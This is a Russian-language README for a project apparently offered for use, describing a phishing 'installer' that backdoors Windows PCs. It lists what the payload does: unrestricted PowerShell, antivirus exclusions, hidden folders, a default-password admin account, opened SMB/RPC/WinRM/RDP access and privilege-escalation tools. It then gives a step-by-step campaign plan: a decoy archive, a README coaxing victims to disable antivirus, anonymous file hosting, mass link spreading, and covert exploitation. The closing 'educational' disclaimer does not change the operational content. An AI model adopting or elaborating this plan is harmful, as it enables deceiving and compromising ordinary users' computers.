# NIT-SilentInstalls

Данный каталог содержит набор скриптов для установки админ-пака методом фишинга.

## Введение

В каталогах данного проекта содержатся примеры «установщика уязвимостей» продукции NIT, для дальнейшей эксплуатации. Функции, реализуемые установщиком:

- Разрешение выполнения неподписанных скриптов PowerShell (*ExecutionPolicy Unrestricted*).
- Установка исключений проверки на вирусы для основных каталогов текущего пользователя.
- Создание каталогов и установка на них исключений антивируса для основных пакетов Админ-пака. Эти каталоги имеют атрибут «Скрытый», чтобы не мозолить глаза пользователю.
- Создание и задание пароля по умолчанию для административной учётной «супер» записи.
- Загрузка и установка программ для создания и распаковки архивов, повышения привилегий запускаемых программ, загрузки файлов из командной строки.
- Открытие доступа к компьютеру по протоколам SMB, RPC, WinRM, RDP в локальной сети (для доступа из вне необходимо будет ещё пробросить порты на роутере).

Как видно, программа не делает ничего такого, что не делал бы в локальной сети администратор компьютера. Поэтому программу можно назвать вредоносной с большой натяжкой. Однако её именно так и определяет антивирусное программное обеспечение. Чтобы уклониться от ненужных вопросов пользователя, и созданы данные программы.

## Системные требования

- Компьютер Windows 10 и Выше. Хотя формально, не проверялось, программа будет работать на системах Windows 6.1, 6.3.
- Аппаратное обеспечение должно соответствовать минимальным требованиям к компьютеру с Windows 10.
- В системе должен либо отсутствовать антивирус, либо должен быть установлен Microsoft Windows Defender для Windows 10+/Windows Server 2016+. Если в системе установлен другой антивирус или старый Windows Defender, исключения антивируса должны быть добавлены вручную.
- Естественно, в системе должна быть папка «Загрузки», доступны терминал, Windows Shell Script, Windows Powershell. Программа проверяет целостность системы при своей установки, и в случае нарушения целостности прекращает установку без предупреждения.

## Принцип действия

1. Создаётся архив, содержащий полезную и вспомогательную нагрузку. В качестве вспомогательной нагрузки может быть медиафайл, рисунок, электронная книга, программа/кряк к программе. Архив представляет собой самораспаковывающийся самоудаляемый 7zip архив, содержащий скрипты полезной нагрузки, возможно, запароленный. Архив распаковывается во временную папку, после чего запускается скрипт нагрузок.
2. Полезная нагрузка представляет собой набор скриптов, запускаемых последовательно из скрипта нагрузок. Незавимсимый запуск обеспечивает гибкую модульную структуру полезной нагрузки. Полезная нагрузка должна запускаться в тихом режиме, повышение привилегий происходит в скрипте нагрузок.
3. Вспомогательная нагрузка представляет собой файл, скрипт и т.п., загружающийся и запускаемый из скрипта нагрузок отдельным процессом, отдельно от полезной нагрузки. Данный скрипт должен быть видимым.
4. Полученный самораспаковывающийся архив помещается в другой ZIP архив вместе с запускающим скриптом (необязательно) и файлом README.txt В этом файле должны быть прописаны заманчивые перспективы запуска файла и не менее веские причины, почему следует отключить антивирус. Это самая сложная часть фишинга.
5. Полученный ZIP  архив (без пароля!) помещается на какой-нибудь анонимный файлообменник с ограниченным сроком хранения, либо в легитимное облако с ограниченным сроком действия внешней ссылки. Эту ссылку можно зашифровать, чтобы запутать антивирус, хотя это не обязательно. Далее нужно распространять ссылки публично, в социальных сетях, E-mail рассылкой, на тематических сайтах и т.п. В виду низкой активности программ обнаружить заражение компьютера программой достаточно сложно. И копируемые на компьютер программы и настройки являются легитимными.
6. Далее нужно запустить процесс эксплуатации. Это осуществляется запуском специально подготовленных документов и программ, которые по определению не будут опознаваться антивирусом как вредоносные, но способны реально причинить вред пользователю, оставаясь незамеченным в системе.

Авес!

## Пример полезной нагрузки

Смотри папку `MainExample`.

## Ограничение использования

Данный проект распространяется в образовательных целях. Не используйте данный проект в критически важной инфраструктуре. Автор категорически не советует внедрять модули эксплуатации в этот файл. Помните, незаконное распространение этой программы приведёт к уголовной ответственности!

